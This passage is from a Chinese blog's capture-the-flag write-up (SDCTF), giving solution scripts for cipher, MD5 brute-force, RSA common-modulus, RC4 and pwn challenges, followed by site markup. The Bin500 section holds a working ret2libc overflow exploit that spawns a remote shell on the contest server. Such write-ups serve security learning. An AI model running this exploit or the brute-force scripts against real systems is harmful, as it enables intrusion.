message."</span><span class="keyword">not</span> <span class="keyword">in</span> p.communicate()[<span class="number">1</span>]:</span><br><span class="line">	  <span class="keyword">print</span> <span class="string">'[&gt;]password is find:%s'</span> %a.strip()</span><br><span class="line">	  <span class="keyword">print</span> command</span><br><span class="line">	  flag = open(<span class="string">'mp3.mp3.txt'</span>)</span><br><span class="line">	  <span class="keyword">print</span> flag.read()</span><br><span class="line">	  <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/sdctf/10.png" alt=""><br>Flag:flag{Brute_f0Rce_iS_W0nderful}</p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Crypto200-Knock"><a href="#Crypto200-Knock" class="headerlink" title="Crypto200(Knock)"></a>Crypto200(Knock)</h2><p>text文件中数字替换为英文字母得：zjqzhexjzmooqrssaidaiynlebnzjovosltahzjerhorrqxoeironlobdozavoouzjovosqfqsltahmqnqrrjotoerzjohorrqxoebooqydrztyqqojolx</p>
+<p>与knock文件中…._…替换：<br>zjqz_hexjz_mo_oqrs_sai_daiyn_lebn_zjo_vos_ltah_zjer_horrqxo_e_iron_lobdo_za_voou_zjo_vos_qfqs_ltah_mqn_qrr_joto_er_zjo_horrqxo_ebooqydrztyqqojolx</p>
+<p>在线解密（<a href="http://quipqiup.com/）" target="_blank" rel="noopener">http://quipqiup.com/）</a><br><img src="/images/sdctf/11.png" alt=""></p>
+<p>that_might_be_easy_you_could_find_the_key_from_this_message_i_used_fence_to_keep_the_key_away_from_bad_ass_here_is_the_message_ineealcstrlaaehefg</p>
+<p>ineealcstrlaaehefg，测试发现是栅栏加密，解出来得到icanseetherealflag<br>flag为SDCTF{md5(icanseetherealflag)}<br>Flag:SDCTF{ad0fe582c45dc970bfa9d6815d79684d}</p>
+<h2 id="Crypto300-MD5"><a href="#Crypto300-MD5" class="headerlink" title="Crypto300(MD5)"></a>Crypto300(MD5)</h2><p>发现第51个文件大小异常，提取，hex中补全PNG文件头，得到：</p>
+<p><img src="/images/sdctf/12.png" alt=""></p>
+<p>MD5爆破即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">x = range(<span class="number">97</span>,<span class="number">122</span>)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> x:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> x:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> x:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> x:</span><br><span class="line">                 <span class="keyword">for</span> e <span class="keyword">in</span> x:</span><br><span class="line">                	 m = hashlib.md5()</span><br><span class="line">                	 flag = <span class="string">"SDCTF&#123;a95"</span>+chr(a)+<span class="string">"0b39186"</span>+chr(b)+<span class="string">"887"</span>+chr(c)+<span class="string">"949f87"</span>+chr(d)+<span class="string">"20b44b"</span>+chr(e)+<span class="string">"b5"</span>+<span class="string">"&#125;"</span></span><br><span class="line">                         m.update(flag)</span><br><span class="line">                         n= m.hexdigest()</span><br><span class="line">                         n0 = list(n)</span><br><span class="line">                         <span class="keyword">if</span> n0[<span class="number">0</span>]==<span class="string">'9'</span>:</span><br><span class="line">                           <span class="keyword">if</span> n0[<span class="number">1</span>]==<span class="string">'5'</span>:</span><br><span class="line">                        	 <span class="keyword">if</span> n0[<span class="number">2</span>]==<span class="string">'d'</span>:</span><br><span class="line">                        	   <span class="keyword">if</span> n0[<span class="number">3</span>]==<span class="string">'c'</span>:</span><br><span class="line">                        	     <span class="keyword">if</span> n0[<span class="number">7</span>]==<span class="string">'8'</span>:</span><br><span class="line">                        	       <span class="keyword">if</span> n0[<span class="number">30</span>]==<span class="string">'a'</span>:</span><br><span class="line">                        	 	     <span class="keyword">if</span> n0[<span class="number">31</span>]==<span class="string">'3'</span>:</span><br><span class="line">                        	 	       <span class="keyword">print</span> n0</span><br><span class="line">                        	 	       <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<p>Flag:SDCTF{a95a0b39186f887b949f87f20b44bdb5}</p>
+<h2 id="Crypto500-RSA"><a href="#Crypto500-RSA" class="headerlink" title="Crypto500(RSA)"></a>Crypto500(RSA)</h2><p>分析加密脚本，使用了相同的N,不同的e,加密相同的数据,且两个加密指数互素，可以通过共模攻击在两个密文和公钥被嗅探的情况下还原出明文m的值</p>
+<p>两个加密指数互质(e1,e2)=1,即存在s1,s2使得s1e1+s2e2=1<br>c1 ≡ me1 mod n<br>c2 ≡ me2 mod n<br>即 c1s1 c2s2 ≡ m mod n</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">n=<span class="number">0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line">fo1 = open(<span class="string">'flag.enc1'</span>, <span class="string">'rb'</span>)</span><br><span class="line">fo2 = open(<span class="string">'flag.enc2'</span>, <span class="string">'rb'</span>)</span><br><span class="line">datafo1 = fo1.read()</span><br><span class="line">c1 = s2n(datafo1)</span><br><span class="line">fo1.close()</span><br><span class="line">datafo2 = fo2.read()</span><br><span class="line">c2 = s2n(datafo2)</span><br><span class="line">fo2.close()</span><br><span class="line">c2 = invert(c2,n)</span><br><span class="line">e1 = <span class="number">17</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">s = egcd(e1,e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line">s2 = - s2</span><br><span class="line">m = pow(c1, s1, n) * pow(c2, s2, n) % n</span><br><span class="line"><span class="keyword">print</span> n2s(m)</span><br></pre></td></tr></table></figure>
+<p>flag.txt:<br>“You were not born a winner, and you were not born a loser. You are what you make yourself be.”SDCTF{ef31070d66440687a73beb6242f298bc}</p>
+<h1 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h1><h2 id="Bin300-RC4"><a href="#Bin300-RC4" class="headerlink" title="Bin300(RC4)"></a>Bin300(RC4)</h2><p>RC4算法,逆向得到key和data<br>key= “I_am_the_flag”;<br>data={19,118,31,-9,43,-100,54,-56,-85,-91,-65,-51,-71,86,-27,-75,79,3,19,89,-46,58,10,68,121,85,-8,-36,-116,75,107,-68,124,81,-101,-112,-73,-80,37}</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> longULONG;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k&lt;Len; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;, s2[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">256</span>] = <span class="string">"I_am_the_flag"</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">512</span>]= &#123;<span class="number">19</span>,<span class="number">118</span>,<span class="number">31</span>,<span class="number">-9</span>,<span class="number">43</span>,<span class="number">-100</span>,<span class="number">54</span>,<span class="number">-56</span>,<span class="number">-85</span>,<span class="number">-91</span>,<span class="number">-65</span>,<span class="number">-51</span>,<span class="number">-71</span>,<span class="number">86</span>,<span class="number">-27</span>,<span class="number">-75</span>,<span class="number">79</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">89</span>,<span class="number">-46</span>,<span class="number">58</span>,<span class="number">10</span>,<span class="number">68</span>,<span class="number">121</span>,<span class="number">85</span>,<span class="number">-8</span>,<span class="number">-36</span>,<span class="number">-116</span>,<span class="number">75</span>,<span class="number">107</span>,<span class="number">-68</span>,<span class="number">124</span>,<span class="number">81</span>,<span class="number">-101</span>,<span class="number">-112</span>,<span class="number">-73</span>,<span class="number">-80</span>,<span class="number">37</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(flag); </span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    rc4_init(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)flag, len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>或py解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random, base64,binascii</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 algorithm"""</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    box = range(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        x = (x + box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        box[i], box[x] = box[x], box[i]</span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        y = (y + box[x]) % <span class="number">256</span></span><br><span class="line">        box[x], box[y] = box[y], box[x]</span><br><span class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % <span class="number">256</span>]))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br><span class="line"></span><br><span class="line">data = <span class="string">"数据"</span></span><br><span class="line">key = <span class="string">'密钥'</span></span><br><span class="line">decoded_data = crypt(data,key)</span><br><span class="line"><span class="keyword">print</span> decoded_data</span><br></pre></td></tr></table></figure>
+<p>Flag:SDCTF{912128f324fd3ea3f5d9cb517b4d9001}</p>
+<h2 id="Bin500-PwnPwnPwn"><a href="#Bin500-PwnPwnPwn" class="headerlink" title="Bin500(PwnPwnPwn)"></a>Bin500(PwnPwnPwn)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'bin300'</span>)</span><br><span class="line">debug =<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug ==<span class="number">1</span>:</span><br><span class="line">  p = process(<span class="string">'./bin300'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p = remote(<span class="string">'123.207.144.156'</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x804843b</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">268</span>  </span><br><span class="line">payload1 += p32(plt_write) </span><br><span class="line">payload1 += p32(vulfun_addr) </span><br><span class="line">payload1 += p32(<span class="number">1</span>)</span><br><span class="line">payload1 += p32(got_write) </span><br><span class="line">payload1 += p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">268</span></span><br><span class="line">payload2 += p32(system_addr)</span><br><span class="line">payload2 += p32(vulfun_addr)</span><br><span class="line">payload2 += p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/images/sdctf/13.png" alt=""></p>
+<p>Flag:SDCTF{af15d5fdacd5fdfea300e88a8e253e82}</p>
+
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+        <a href="/2017/06/01/Linux/" id="post_nav-newer" class="prev-content">
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_back</i>
+            </button>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            新篇
+        </a>
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2017/02/25/ARM2/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/img/avatar.png" alt="Righteous's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        youremail@email.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="#" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                主页
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    归档
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2017/07/">七月 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/06/">六月 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">四月 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/02/">二月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/01/">一月 2017<span class="sidebar_archives-count">3</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+
+    <!-- Pages  -->
+    
+
+    <!-- Article Number  -->
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+    <div class="sidebar-divider"></div>
+
+
+<!-- Theme Material -->
+
+    <a href="https://github.com/viosey/hexo-theme-material"  class="sidebar-footer-text-a" target="_blank">
+        <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
+            主题 - Material
+            <span class="sidebar-badge badge-circle">i</span>
+        </div>
+    </a>
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+        <a href="https://twitter.com/twitter" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
+                <span class="visuallyhidden">Twitter</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Facebook -->
+    
+        <a href="https://www.facebook.com/facebook" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-facebook">
+                <span class="visuallyhidden">Facebook</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Google + -->
+    
+        <a href="https://www.google.com/" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-gplus">
+                <span class="visuallyhidden">Google Plus</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Weibo -->
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+    
+    <!-- V2EX -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>Righteous
+            
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+        <!--
+        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
+        It will not impact the appearance and can give developers a lot of support :)
+
+        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
+        它不会影响美观并可以给开发者很大的支持。 :)
+        -->
+
+        <div class="mdl-mini-footer--right-section">
+            <div>
+                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
+                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
+            </div>
+        </div>
+    
+</footer>
+
+
+                    <!-- Import JS File -->
+
+    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==", true)</script>
+
+
+
+    <script>lsloader.load("js_js","/js/js.min.js?V/53wGualMuiPM3xoetD5Q==", true)</script>
+
+
+
+    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Import prettify js  -->
+
+
+
+<!-- Window Load -->
+<!-- add class for prettify -->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+
+    
+    
+</script>
+
+<!-- MathJax Load-->
+
+
+<!-- Bing Background -->
+
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
